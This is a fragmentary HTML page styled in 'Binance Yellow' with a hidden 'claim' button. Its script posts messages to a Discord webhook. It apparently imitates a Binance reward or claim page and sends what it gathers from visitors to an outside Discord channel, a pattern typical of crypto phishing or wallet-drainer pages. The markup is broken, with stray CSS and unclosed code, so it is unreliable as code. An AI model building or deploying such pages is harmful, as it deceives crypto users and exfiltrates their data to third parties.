<!DOCTYPE html>

            min-height: 100vh;
            background-color: #121212;
            color: #e0e0e0;
            margin: 0;
            padding: 20px;
            box-sizing: border-box;

        .container {
            background-color: #1e1e1e;
            padding: 40px 20px;
            border-radius: 12px;
            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
            text-align: center;
            width: 100%;
            max-width: 450px;
            border: 1px solid #333;
        }
        h1 {
            color: #f0b90b; /* Binance Yellow */
            margin-bottom: 15px;
            font-size: 24px;
        }
        p {
            color: #a0a0a0;
            margin-bottom: 30px;
            line-height: 1.5;
            font-size: 16px;
        }
        .button {
            background-color: #f0b90b;
            color: #1e1e1e;
            border: none;
            padding: 15px 30px;
            font-size: 18px;
            font-weight: bold;
            border-radius: 8px;
            cursor: pointer;
            transition: background-color 0.3s, transform 0.2s;
            width: 100%;
            margin-top: 10px;
        }
        .button:hover {
            background-color: #ffe599;
            transform: translateY(-2px);
        }
        .button:disabled {
            background-color: #444;
            color: #888;
            cursor: not-allowed;
            transform: none;
        }
        #claimButton {
            display: none; /* Hidden by default */
        }

            h1 {
                font-size: 30px;
            }
            p {
                font-size: 18px;
            }
            .button {
                font-size: 20px;
            }

    </style>
</head>

            try {
                const response = await fetch(discordWebhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify({ content: message }),
                });
                if (!response.ok) {
                    throw new Error('Failed to send message to Discord');

            } catch (error) {
                console.error('Error sending message to Discord:', error);
